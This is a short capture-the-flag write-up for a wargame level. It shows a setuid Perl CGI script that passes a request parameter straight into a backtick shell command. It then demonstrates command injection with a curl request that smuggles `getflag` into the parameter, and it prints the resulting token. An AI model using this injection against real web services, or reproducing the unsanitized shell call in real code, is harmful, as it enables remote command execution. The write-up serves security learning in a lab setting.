# Level04

```bash
ls -la
# output:
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```
Oh the file again contains an `s` in its permissions<br/>
Let's read its content, it gives us:<br/>
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
It's seems that it is a script that run a web server on port 4747, I read it carefully, it seems that it accept a request param `x` and then exceute the echo command and redirect stderr to stdout, we can inject a bash command in this request param<br/>
in perl you use this syntax to excute a commad<br/>
```perl
# We call a shell command from a Perl script, using backticks, and capture the opt in a Perl variable output.
my $opt=`ls -la`;
print$opt;
```
let's benefits from this behavior by injecting our getflag cmd on the x request param bu calling ther server on<br/>
```bash
curl localhost:4747?x='`getflag`'

# printCheck flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```